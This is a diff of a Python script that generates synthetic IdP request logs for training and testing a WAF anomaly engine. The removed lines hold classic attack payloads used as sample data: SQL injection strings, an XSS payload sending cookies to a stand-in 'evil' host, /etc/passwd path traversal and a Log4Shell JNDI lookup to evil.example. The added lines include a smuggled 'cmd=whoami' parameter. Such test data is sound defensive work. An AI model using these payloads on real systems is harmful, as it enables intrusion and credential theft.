@@ -1,204 +1,166 @@
 """
-Generate a realistic ModSecurity JSON audit log for a WSO2 Identity Server
-(IS 7.2) deployment sitting behind the OWASP CRS.
+Generate a realistic request log for a WSO2 Identity Server (IS 7.2) deployment,
+in the JSON-lines format the engine consumes.
 
-This exists so the engine, tests and dashboard have something to chew on
-WITHOUT needing the full Docker stack up. The traffic shape is deliberately
-faithful to what an IdP actually produces behind a WAF:
+Writes two files so the baselining workflow is honest:
 
-* **Legitimate OIDC/SAML flows that false-positive the CRS.** The classic ones:
-    - `redirect_uri` (a full URL) trips protocol/URL rules (921xxx).
-    - `SAMLRequest` (base64+deflate) and long `state`/`code` tokens trip
-      various rules that dislike long opaque blobs.
-    - a `sessionDataKey` UUID that a signature mis-reads.
-  These are broad: hundreds of different real users, low anomaly, benign data.
+* ``baseline.jsonl`` — NORMAL traffic only. Many users each completing the full
+  OIDC login flow (authorize -> login -> commonauth -> token -> userinfo) plus
+  some SCIM and SAML. This is what the engine LEARNS from.
+* ``mixed.jsonl``    — a fresh day of traffic: mostly normal, plus a labelled
+  holdout of ABNORMAL-but-not-signature traffic (a param far longer than
+  normal, an unexpected parameter, a wrong method, an out-of-order flow, a new
+  endpoint). None of it is a classic "attack payload" — the whole point is that
+  positive-security catches deviation from normal, not signatures.
 
-* **A smaller amount of genuine attack traffic** from a few IPs: SQLi on the
-  login/basic-auth params, XSS reflected via an error page, path traversal on
-  a static asset, and a Log4Shell probe in a header — narrow, high-anomaly,
-  classic payloads.
-
-Run: ``python sample-data/generate_sample.py > sample-data/sample_audit.jsonl``
+Run: ``python sample-data/generate_sample.py``
 """
 from __future__ import annotations
 
 import base64
 import json
+import os
 import random
-import sys
 import uuid
 from datetime import datetime, timedelta
 
-random.seed(1337)
+random.seed(7)
+_HERE = os.path.dirname(os.path.abspath(__file__))
+_T0 = datetime(2026, 7, 28, 8, 0, 0)
 
-_NOW = datetime(2026, 7, 28, 9, 0, 0)
+REDIRECTS = [
+    "https://app.example.com/callback",
+    "https://portal.example.com/oidc/cb",
+    "https://spa.example.com/auth",
+]
+UAS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) Safari/17.5",
+    "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0",
+]
 
 
-def _ts(i: int) -> str:
-    return (_NOW + timedelta(seconds=i * 3)).strftime("%a %b %d %H:%M:%S %Y")
+def _b64(n=16):
+    return base64.urlsafe_b64encode(os.urandom(n)).decode().rstrip("=")
 
 
-def _client_pool(n: int, prefix: str = "10.0") -> list[str]:
-    return [f"{prefix}.{random.randint(0,254)}.{random.randint(1,254)}" for _ in range(n)]
-
-
-def event(client_ip, method, uri, code, messages, ua="Mozilla/5.0"):
+def req(ts, ip, method, uri, status, sess, ua, label="normal", body=0):
     return {
-        "transaction": {
-            "client_ip": client_ip,
-            "time_stamp": _ts(random.randint(0, 5000)),
-            "request": {
-                "method": method,
-                "uri": uri,
-                "headers": {"User-Agent": ua, "Host": "id.example.com"},
-            },
-            "response": {"http_code": code},
-            "messages": messages,
-        }
+        "ts": ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
+        "client_ip": ip,
+        "method": method,
+        "uri": uri,
+        "headers": {"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded" if method == "POST" else ""},
+        "body_size": body,
+        "status": status,
+        "session_id": sess,
+        "label": label,
     }
 
 
-def msg(rule_id, message, data, severity="3", tags=None, score=None):
-    m = {
-        "message": message + (f" (Total Score: {score})" if score else ""),
-        "details": {
-            "ruleId": str(rule_id),
-            "data": data,
-            "severity": severity,
-            "tags": tags or [],
-        },
-    }
-    return m
+def normal_oidc_session(ip, ua, t, sess):
+    """A full, well-formed OIDC login flow -> list of requests."""
+    state = _b64(); code = _b64(32); rurl = random.choice(REDIRECTS)
+    sdk = str(uuid.uuid4())
+    out = [
+        req(t, ip, "GET",
+            f"/oauth2/authorize?response_type=code&client_id=sample_spa&redirect_uri={rurl}&scope=openid%20profile&state={state}",
+            302, sess, ua),
+        req(t + timedelta(seconds=2), ip, "GET",
+            f"/authenticationendpoint/login.do?client_id=sample_spa&sessionDataKey={sdk}",
+            200, sess, ua),
+        req(t + timedelta(seconds=6), ip, "POST",
+            f"/commonauth?sessionDataKey={sdk}&type=oidc", 302, sess, ua, body=120),
+        req(t + timedelta(seconds=7), ip, "POST",
+            "/oauth2/token?grant_type=authorization_code&code=" + code + "&client_id=sample_spa",
+            200, sess, ua, body=180),
+        req(t + timedelta(seconds=8), ip, "GET", "/oauth2/userinfo", 200, sess, ua),
+    ]
+    return out
 
 
-def build() -> list[dict]:
-    events: list[dict] = []
+def normal_saml_session(ip, ua, t, sess):
+    blob = base64.b64encode(f"<samlp:AuthnRequest ID='{uuid.uuid4()}'/>".encode()).decode()
+    return [
+        req(t, ip, "GET", f"/samlsso?SAMLRequest={blob}&RelayState=/portal", 302, sess, ua),
+        req(t + timedelta(seconds=4), ip, "POST", "/commonauth?type=samlsso", 302, sess, ua, body=140),
+    ]
 
-    # --- FALSE POSITIVES: broad, benign IdP parameters ---------------------
-    legit_users = _client_pool(120)  # 120 distinct legitimate clients
 
-    # 1. redirect_uri trips 921151 (HTTP header/URL) on /oauth2/authorize
-    for ip in legit_users:
-        rurl = random.choice([
-            "https://app.example.com/callback",
-            "https://portal.example.com/oidc/cb",
-            "https://spa.example.com/#/auth",
-        ])
-        state = base64.urlsafe_b64encode(uuid.uuid4().bytes).decode().rstrip("=")
-        uri = (
-            f"/oauth2/authorize?response_type=code&client_id=web_app"
-            f"&redirect_uri={rurl}&scope=openid%20profile&state={state}"
-        )
-        events.append(event(ip, "GET", uri, 403, [
-            msg("921151", "HTTP Header Injection Attack via payload",
-                f"Matched Data: {rurl} found within ARGS:redirect_uri: {rurl}",
-                tags=["OWASP_CRS", "protocol-attack"]),
-            msg("949110", "Inbound Anomaly Score Exceeded",
-                "", tags=["anomaly-evaluation"], score=5),
-        ]))
+def normal_scim_session(ip, ua, t, sess):
+    uid = uuid.uuid4()
+    return [
+        req(t, ip, "GET", f'/scim2/Users?filter=userName%20eq%20%22user{random.randint(1,999)}%22', 200, sess, ua),
+        req(t + timedelta(seconds=1), ip, "GET", f"/scim2/Users/{uid}", 200, sess, ua),
+    ]
 
-    # 2. long `state`/`code` opaque tokens trip 942432 (restricted SQL chars)
-    for ip in random.sample(legit_users, 60):
-        code = base64.urlsafe_b64encode(uuid.uuid4().bytes + uuid.uuid4().bytes).decode().rstrip("=")
-        uri = f"/oauth2/token?grant_type=authorization_code&code={code}&client_id=web_app"
-        events.append(event(ip, "POST", uri, 403, [
-            msg("942432", "Restricted SQL Character Anomaly Detection",
-                f"Matched Data: {code[:12]} found within ARGS:code: {code}",
-                severity="4", tags=["attack-sqli"]),
-            msg("949110", "Inbound Anomaly Score Exceeded", "", score=5),
-        ]))
 
-    # 3. SAMLRequest base64 blob trips 942190 on /samlsso
-    for ip in random.sample(legit_users, 45):
-        saml = base64.b64encode(("<samlp:AuthnRequest ID='%s'/>" % uuid.uuid4()).encode()).decode()
-        uri = f"/samlsso?SAMLRequest={saml}&RelayState=/portal"
-        events.append(event(ip, "GET", uri, 403, [
-            msg("942190", "Detects MSSQL code execution and information gathering",
-                f"Matched Data: {saml[:10]} found within ARGS:SAMLRequest: {saml}",
-                severity="2", tags=["attack-sqli"]),
-            msg("949110", "Inbound Anomaly Score Exceeded", "", score=5),
-        ]))
+def build_baseline(n_users=250):
+    rows = []
+    t = _T0
+    for i in range(n_users):
+        ip = f"10.0.{random.randint(0,40)}.{random.randint(1,254)}"
+        ua = random.choice(UAS)
+        sess = f"sess-{i:04d}"
+        t += timedelta(seconds=random.randint(1, 20))
+        roll = random.random()
+        if roll < 0.7:
+            rows += normal_oidc_session(ip, ua, t, sess)
+        elif roll < 0.9:
+            rows += normal_scim_session(ip, ua, t, sess)
+        else:
+            rows += normal_saml_session(ip, ua, t, sess)
+    return rows
 
-    # 4. sessionDataKey UUID trips 920273 (invalid chars) on /commonauth
-    for ip in random.sample(legit_users, 30):
-        sdk = str(uuid.uuid4())
-        uri = f"/commonauth?sessionDataKey={sdk}&type=oidc"
-        events.append(event(ip, "GET", uri, 403, [
-            msg("920273", "Invalid character in request (outside of very strict set)",
-                f"Matched Data: - found within ARGS:sessionDataKey: {sdk}",
-                severity="4", tags=["protocol-attack"]),
-            msg("949110", "Inbound Anomaly Score Exceeded", "", score=5),
-        ]))
 
-    # --- REAL ATTACKS: narrow, high-anomaly, classic payloads --------------
-    attackers = ["45.9.148.3", "185.220.101.7", "91.219.236.19"]
+def build_mixed():
+    rows = build_baseline(n_users=80)  # a fresh, smaller normal day
+    t = _T0 + timedelta(hours=2)
 
-    # SQLi on the login username (few IPs, many paths = scanning)
-    for _ in range(14):
-        ip = random.choice(attackers)
-        payload = random.choice([
-            "admin' OR 1=1--", "' UNION SELECT username,password FROM users--",
-            "'; WAITFOR DELAY '0:0:5'--",
-        ])
-        uri = f"/authenticationendpoint/login.do?username={payload}&password=x"
-        events.append(event(ip, "POST", uri, 403, [
-            msg("942100", "SQL Injection Attack Detected via libinjection",
-                f"Matched Data: {payload} found within ARGS:username: {payload}",
-                severity="2", tags=["attack-sqli"]),
-            msg("949110", "Inbound Anomaly Score Exceeded", "", score=15),
-        ], ua="sqlmap/1.7"))
+    # --- ABNORMAL holdout (labelled), NOT signature attacks ---
+    # 1. redirect_uri far longer than the learned normal (data exfil-ish / fuzz)
+    for k in range(6):
+        ip = "203.0.113.5"; sess = f"ab-len-{k}"
+        long_uri = "https://evil.example/" + ("A" * 400)
+        rows.append(req(t, ip, "GET",
+            f"/oauth2/authorize?response_type=code&client_id=sample_spa&redirect_uri={long_uri}&scope=openid&state=x",
+            302, sess, UAS[0], label="abnormal"))
+    # 2. unexpected parameter never seen on the endpoint
+    for k in range(5):
+        ip = "203.0.113.9"; sess = f"ab-param-{k}"
+        rows.append(req(t, ip, "GET",
+            "/oauth2/token?grant_type=authorization_code&code=" + _b64(32) + "&client_id=sample_spa&debug=1&cmd=whoami",
+            200, sess, UAS[1], label="abnormal"))
+    # 3. wrong method on a known endpoint
+    for k in range(5):
+        ip = "203.0.113.11"; sess = f"ab-method-{k}"
+        rows.append(req(t, ip, "DELETE", "/oauth2/userinfo", 405, sess, UAS[2], label="abnormal"))
+    # 4. brand-new endpoint never in baseline (recon)
+    for k in range(5):
+        ip = "203.0.113.13"; sess = f"ab-ep-{k}"
+        rows.append(req(t, ip, "GET", f"/carbon/admin/login.jsp?x={k}", 200, sess, "curl/8.0", label="abnormal"))
+    # 5. out-of-order flow: token WITHOUT a preceding authorize
+    for k in range(5):
+        ip = "203.0.113.17"; sess = f"ab-seq-{k}"
+        rows.append(req(t, ip, "POST",
+            "/oauth2/token?grant_type=authorization_code&code=" + _b64(32) + "&client_id=sample_spa",
+            400, sess, UAS[0], label="abnormal", body=180))
+        rows.append(req(t + timedelta(seconds=1), ip, "GET", "/oauth2/userinfo", 401, sess, UAS[0], label="abnormal"))
 
-    # XSS reflected via error page param
-    for _ in range(9):
-        ip = random.choice(attackers)
-        payload = "<script>document.location='//evil/'+document.cookie</script>"
-        uri = f"/authenticationendpoint/error.jsp?message={payload}"
-        events.append(event(ip, "GET", uri, 403, [
-            msg("941100", "XSS Attack Detected via libinjection",
-                f"Matched Data: {payload[:20]} found within ARGS:message: {payload}",
-                severity="2", tags=["attack-xss"]),
-            msg("949110", "Inbound Anomaly Score Exceeded", "", score=15),
-        ], ua="Mozilla/5.0 (scanner)"))
+    random.shuffle(rows)
+    return rows
 
-    # Path traversal on a static asset
-    for _ in range(7):
-        ip = random.choice(attackers)
-        payload = "../../../../etc/passwd"
-        uri = f"/authenticationendpoint/css/../../{payload}"
-        events.append(event(ip, "GET", uri, 403, [
-            msg("930110", "Path Traversal Attack (/../)",
-                f"Matched Data: ../ found within REQUEST_URI: {uri}",
-                severity="2", tags=["attack-lfi"]),
-            msg("949110", "Inbound Anomaly Score Exceeded", "", score=10),
-        ], ua="curl/8.0"))
 
-    # Log4Shell probe in a header on /scim2/Users
-    for _ in range(5):
-        ip = random.choice(attackers)
-        payload = "${jndi:ldap://evil.example/a}"
-        uri = "/scim2/Users"
-        events.append(event(ip, "GET", uri, 403, [
-            msg("944100", "Remote Command Execution: Suspicious Java class detected",
-                f"Matched Data: {payload} found within REQUEST_HEADERS:User-Agent: {payload}",
-                severity="2", tags=["language-java", "attack-rce"]),
-            msg("949110", "Inbound Anomaly Score Exceeded", "", score=15),
-        ], ua=payload))
-
-    # --- AMBIGUOUS: a param that's borderline (few clients, no signature) ---
-    for ip in _client_pool(3, prefix="172.16"):
-        uri = "/scim2/Users?filter=userName%20eq%20%22a'b%22"
-        events.append(event(ip, "GET", uri, 403, [
-            msg("942100", "SQL Injection Attack Detected via libinjection",
-                "Matched Data: 'b found within ARGS:filter: userName eq \"a'b\"",
-                severity="2", tags=["attack-sqli"]),
-            msg("949110", "Inbound Anomaly Score Exceeded", "", score=5),
-        ]))
-
-    random.shuffle(events)
-    return events
+def _dump(name, rows):
+    path = os.path.join(_HERE, name)
+    with open(path, "w", encoding="utf-8") as fh:
+        for r in rows:
+            fh.write(json.dumps(r) + "\n")
+    return path, len(rows)
 
 
 if __name__ == "__main__":
-    out = sys.stdout
-    for ev in build():
-        out.write(json.dumps(ev) + "\n")
+    b = _dump("baseline.jsonl", build_baseline())
+    m = _dump("mixed.jsonl", build_mixed())
+    print(f"wrote {b[0]} ({b[1]} requests)")
+    print(f"wrote {m[0]} ({m[1]} requests)")
